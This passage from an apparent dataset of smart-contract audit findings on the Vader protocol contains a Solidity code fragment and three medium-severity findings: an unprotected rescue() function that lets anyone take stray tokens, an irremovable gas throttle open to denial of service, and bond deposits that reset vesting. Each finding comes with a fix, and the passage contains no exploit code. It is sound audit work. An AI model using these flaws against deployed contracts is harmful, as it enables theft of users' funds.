        liquidity > 0,
        ""BasePoolV2::mint: Insufficient Liquidity Provided""
    );

    uint256 id = positionId++;

    pair.totalSupply = totalLiquidityUnits + liquidity;
    _mint(to, id);

    positions[id] = Position(
        foreignAsset,
        block.timestamp,
        liquidity,
        nativeDeposit,
        foreignDeposit
    );

    _update(
        foreignAsset,
        reserveNative + nativeDeposit,
        reserveForeign + foreignDeposit,
        reserveNative,
        reserveForeign
    );

    emit Mint(from, to, nativeDeposit, foreignDeposit);
    emit PositionOpened(from, to, id, liquidity);
}
```

#### Recommended

Consider calling `balanceOf()` to get the actual balances."
52.md,VaderPoolV2.rescue results in loss of funds rather than recoverability,medium,"#### Impact

Any unaccounted for tokens on `VaderPoolV2` can be siphoned off by anyone

#### Proof of Concept

`VaderPoolV2` has a `rescue` function which allows any unaccounted for tokens to be recovered.

<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/BasePoolV2.sol#L505-L517>

However there is no access control on this function which means than should any tokens be sent to `VaderPoolV2` by accident they'll just be scooped up by flashbots rather than being recoverable by the original owner or Vader governance.

This also means that any rebasing tokens which are deposited into `VaderPoolV2` will have any rebases lost rather than being recoverable by Vader governance.

#### Recommended Mitigation Steps

Permission this function to only allow Vader governance to claim tokens."
52.md,No way to remove GasThrottle after deployment,medium,"#### Impact

Potential DOS on swaps

#### Proof of Concept

BasePool and BasePoolV2 make use of a `validateGas` modifier on swaps which checks that the user's gas price is below the value returned by `_FAST_GAS_ORACLE`.

<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex/utils/GasThrottle.sol#L9-L20>

Should  `_FAST_GAS_ORACLE` be compromised to always return zero then all swaps will fail. There is no way to recover from this scenario.

#### Recommended Mitigation Steps

Either remove GasThrottle.sol entirely or allow governance to turn it off"
52.md,Users Can Reset Bond Depositor's Vesting Period,medium,"#### Impact

The `VaderBond.deposit()` function overwrites a depositors bond info on each call with the updated `payout` information. If any of the vesting is left unclaimed before a call to `deposit()` is made, the vesting period is reset to `terms.vestingTerm`, resulting in the bond holder having to wait again in order to claim tokens that they could previously claim.

#### Proof of Concept

<https://github.com/code-423n4/2021-11-vader/blob/main/repo/vader-bond/contracts/VaderBond.sol#L192>

#### Tools Used

Manual code review.

#### Recommended Mitigation Steps

Consider preventing users from depositing to an existing bond holder or alternatively when a deposit is made, force the user to redeem any claimable tokens in the same function."
